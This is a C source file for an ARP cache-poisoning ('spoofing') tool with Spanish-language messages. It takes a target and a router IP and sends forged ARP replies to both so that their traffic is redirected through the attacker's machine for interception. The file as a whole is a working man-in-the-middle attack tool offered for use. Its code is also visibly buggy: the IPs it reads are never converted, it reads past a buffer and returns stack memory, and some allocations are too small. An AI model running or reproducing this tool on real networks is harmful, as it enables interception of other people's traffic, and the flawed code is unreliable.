#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define color_reset "\x1b[0m"

char * color(int index);
char * background(int index);
char * mac_to_text(uint8_t * mac);
uint32_t get_local_ip(char * iface);
uint8_t * get_local_mac(char * iface);
uint8_t * get_mac(uint8_t * source_mac, uint32_t source_ip, uint32_t dest_ip, char * iface);
void send_arp(uint8_t * source_mac, uint32_t source_ip, uint8_t * dest_mac, uint32_t dest_ip, char * iface);

struct arp_header {
        uint16_t hardware_type;
        uint16_t protocol_type;
        uint8_t hardware_len;
        uint8_t protocol_len;
        uint16_t op;
        uint8_t sha[6];
        uint32_t spa;
        uint8_t tha[6];
        uint32_t tpa;
} __attribute__((packed));

int main() {
        char iface[IFNAMSIZ];
        char text_target_ip[15];
        char text_router_ip[15];
        uint32_t target_ip;
        uint32_t router_ip;
        printf("%sARP Spoofer (C) 2024 X-Leamsi%s\n\n", color(4), color_reset);
        printf("[%sIface%s]: ", color(2), color_reset);
        scanf("%s", iface);
        printf("[%sTarget IP%s]: ", color(2), color_reset);
        scanf("%s", text_target_ip);
        printf("[%sRouter IP%s]: ", color(2), color_reset);
        scanf("%s", text_router_ip);

        uint32_t local_ip = get_local_ip(iface);
        uint8_t * local_mac = get_local_mac(iface);

        printf("\n\n(%s***%s) %sInicinado Ataque de Susplantacion de las tablas ARP%s\n",
        color(4), color_reset, color(3), color_reset);

        printf("\n(%s***%s) IP de esta maquina: %s%s%s%s; MAC de esta maquina: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), inet_ntoa(*(struct in_addr*)&local_ip), color_reset,
        background(6), color(0), mac_to_text(local_mac), color_reset);

        printf("\n(%s***%s) IP del Objetivo: %s%s%s%s; IP del Router: %s%s%s%s; Interfaz de Red: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), text_target_ip, color_reset,
        background(6), color(0), text_router_ip, color_reset, background(6), color(0), iface, color_reset);

        uint8_t * target_mac = get_mac(local_mac, local_ip, target_ip, iface);
        uint8_t * router_mac = get_mac(local_mac, local_ip, router_ip, iface);

        printf("\n(%s***%s) MAC del Objetivo: %s%s%s%s; MAC del Router: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), mac_to_text(target_mac), color_reset,
        background(6), color(0), mac_to_text(router_mac), color_reset);

        send_arp(local_mac, router_ip, target_mac, target_ip, iface);
        send_arp(local_mac, target_ip, router_mac, router_ip, iface);

        printf("\n\n(%s***%s) %sSusplantacion ARP iniciada%s\n",
        color(5), color_reset, color(1), color_reset);

        printf("Use [Q] para terminar ataque\n");
        while (getchar() != 'Q');

        send_arp(router_mac, router_ip, target_mac, target_ip, iface);
        send_arp(target_mac, target_ip, router_mac, router_ip, iface);
        printf("\n(%s***%s) %sAtaque tarminado%s\n",
        color(5), color_reset, color(2), color_reset);
        exit(EXIT_SUCCESS);
}

char * color(int index) {
        char * var_color = malloc(5);
        sprintf(var_color, "\x1b[3%dm", index);
        return var_color;
}

char * background(int index) {
        char * var_background = malloc(5);
        sprintf(var_background, "\x1b[4%dm", index);
        return var_background;
}

char * mac_to_text(uint8_t * mac) {
        char * text = malloc(17);
        sprintf(text, "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return text;
}

uint32_t get_local_ip(char * iface) {
        struct ifreq ifr;
        struct sockaddr_in * addr = (struct sockaddr_in*)&ifr.ifr_addr;
        strncpy(ifr.ifr_name, iface, IFNAMSIZ);
        int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al crear socket%s]",
                color(2), color_reset);
                perror(text_error);
                exit(EXIT_FAILURE);
        }
        if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError en el ioctl%s]",
                color(2), color_reset);
                perror(text_error);
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        close(sockfd);
        return addr->sin_addr.s_addr;
}

uint8_t * get_local_mac(char * iface) {
        uint8_t * mac = malloc(6);
        struct ifreq ifr;
        strncpy(ifr.ifr_name, iface, IFNAMSIZ);
        int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al crear socket%s]",
                color(2), color_reset);
                perror(text_error);
                exit(EXIT_FAILURE);
        }
        if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
                char text_error[100];
                printf(text_error, "[%sError en el ioctl%s]",
                color(2), color_reset);
                perror(text_error);
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        close(sockfd);
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
        return mac;
}

uint8_t * get_mac(uint8_t * source_mac, uint32_t source_ip, uint32_t dest_ip, char * iface) {
        uint8_t ether_dst[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        uint8_t arp_dst[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        struct ethhdr eth;
        memcpy(eth.h_source, source_mac, 6);
        memcpy(eth.h_dest, ether_dst, 6);
        eth.h_proto = htons(ETH_P_ARP);
        struct arp_header arp;
        arp.hardware_type = htons(ARPHRD_ETHER);
        arp.protocol_type = htons(0x0800);
        arp.hardware_len = 6;
        arp.protocol_len = 4;
        arp.op = htons(1);
        memcpy(arp.sha, source_mac, 6);
        arp.spa = source_ip;
        memcpy(arp.tha, arp_dst, 6);
        arp.tpa = dest_ip;
        char buffer[sizeof(eth) + sizeof(arp)];
        memcpy(buffer, &eth, sizeof(eth));
        memcpy(buffer + sizeof(eth), &arp, sizeof(arp));
        struct sockaddr_ll addr;
        addr.sll_family = AF_PACKET;
        addr.sll_protocol = htons(ETH_P_ARP);
        addr.sll_ifindex = if_nametoindex(iface);
        socklen_t addrlen = sizeof(addr);
        int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sockfd < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al crear el socket raw%s]",
                color(2), color_reset);
                perror(text_error);
                exit(EXIT_FAILURE);
        }
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, addrlen) < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError ao enviar packet ARP%s]",
                color(2), color_reset);
                perror(text_error);
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        memset(buffer, 0, sizeof(buffer));
        if (recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addrlen) < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al recivir el encabezado ARP%s]",
                color(2), color_reset);
                perror(text_error);
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        struct arp_header * resp = (struct arp_header*)(buffer + sizeof(buffer));
        close(sockfd);
        return resp->sha;
}

void send_arp(uint8_t * source_mac, uint32_t source_ip,
uint8_t * dest_mac, uint32_t dest_ip, char * iface) {
        struct ethhdr eth;
        memcpy(eth.h_source, source_mac, 6);
        memcpy(eth.h_dest, dest_mac, 6);
        eth.h_proto = htons(ETH_P_ARP);
        struct arp_header arp;
        arp.hardware_type = htons(ARPHRD_ETHER);
        arp.protocol_type = htons(0x0800);
        arp.hardware_len = 6;
        arp.protocol_len = 4;
        arp.op = htons(2);
        memcpy(arp.sha, source_mac, 6);
        arp.spa = source_ip;
        memcpy(arp.tha, dest_mac, 6);
        arp.tpa = dest_ip;
        char buffer[sizeof(eth) + sizeof(arp)];
        memcpy(buffer, &eth, sizeof(eth));
        memcpy(buffer + sizeof(eth), &arp, sizeof(arp));
        struct sockaddr_ll addr;
        addr.sll_family = AF_PACKET;
        addr.sll_protocol = htons(ETH_P_ARP);
        addr.sll_ifindex = if_nametoindex(iface);
        socklen_t addrlen = sizeof(addr);
        int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sockfd < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al crear socket raw%s]",
                color(2), color_reset);
                perror(text_error);
                exit(EXIT_FAILURE);
        }
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, addrlen) < 0) {
                char text_error[100];
                sprintf(text_error, "[%sError al enviar packete ARP%s]",
                color(2), color_reset);
                perror(text_error);
                close(sockfd);
                exit(EXIT_FAILURE);
        }
        close(sockfd);
}
